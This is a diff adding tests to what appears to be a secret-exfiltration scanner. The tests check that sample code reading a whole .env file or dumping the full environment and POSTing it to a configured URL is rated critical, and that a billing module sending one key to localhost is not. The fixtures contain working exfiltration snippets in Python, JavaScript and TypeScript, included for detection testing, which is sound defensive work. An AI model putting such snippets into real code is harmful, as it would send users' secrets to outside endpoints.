@@ -850,3 +850,61 @@ def test_github_token_to_github_is_still_excused():
         ' headers={"Authorization": "token " + os.environ["GITHUB_TOKEN"]}, json={})\n'
     )
     assert _exfil("a.py", src)[0] is None
+
+
+# ── Whole .env / environment to an endpoint you configure: critical ─────────────
+
+def test_whole_env_file_to_a_configured_endpoint_is_critical():
+    for path, src in [
+        ("a.py", "import os, requests\n"
+                 'raw = open(os.path.expanduser("~/.env")).read()\n'
+                 'requests.post(os.environ["SYNC_URL"], data=raw)\n'),
+        ("a.js", 'const raw = readFileSync(join(import.meta.dir, "..", ".env"), "utf-8");\n'
+                 "fetch(process.env.SYNC_URL, { method: 'POST', body: raw });\n"),
+        ("a.ts", 'const raw = readFileSync(".env", "utf-8");\n'
+                 'const base = process.env.SYNC_URL || "http://localhost:8787";\n'
+                 "fetch(base, { method: 'POST', body: raw });\n"),
+    ]:
+        worst, fs = _exfil(path, src)
+        assert worst == "critical", (src, [(f.name, f.severity) for f in fs])
+
+
+def test_whole_environment_to_a_configured_endpoint_is_critical():
+    src = "import os, requests, sys\nrequests.post(sys.argv[1], json=dict(os.environ))\n"
+    assert _exfil("a.py", src)[0] == "critical"
+
+
+BILLING_LIKE = '''import { readFileSync } from "fs";
+import { join } from "path";
+
+function envOrDotEnv(key: string): string | undefined {
+  const direct = process.env[key];
+  if (direct && direct.trim()) return direct.trim();
+  const raw = readFileSync(join(import.meta.dir, "..", ".env"), "utf-8");
+  const match = raw.match(new RegExp(`^${key}=["']?([^"'\\\\n]+)`, "m"));
+  if (match?.[1]) return match[1].trim();
+  return undefined;
+}
+
+function packageApiBaseUrl(): string {
+  return envOrDotEnv("XINT_PACKAGE_API_BASE_URL") || "http://localhost:8787/v1";
+}
+
+async function callPackageApi(path: string) {
+  const url = `${packageApiBaseUrl()}${path}`;
+  const headers: Record<string, string> = {};
+  const apiKey = envOrDotEnv("XINT_PACKAGE_API_KEY");
+  if (apiKey) headers.Authorization = `Bearer ${apiKey}`;
+  return fetch(url, { headers });
+}
+'''
+
+
+def test_one_value_from_env_to_a_local_default_endpoint_stays_review_at_most():
+    # xint lib/billing.ts: the endpoint resolves to its hardcoded default
+    # (localhost:8787), and what's sent is ONE key pulled out of the .env.
+    from src.scanner.skill_key_flow import contents_reached, strip_comments
+    code = strip_comments(BILLING_LIKE, "billing.ts")
+    assert contents_reached(code, path="billing.ts") == ["localhost"]
+    assert contents_reached(code, path="billing.ts", whole=True) == []
+    assert _exfil("lib/billing.ts", BILLING_LIKE)[0] in ("high", "medium", None)
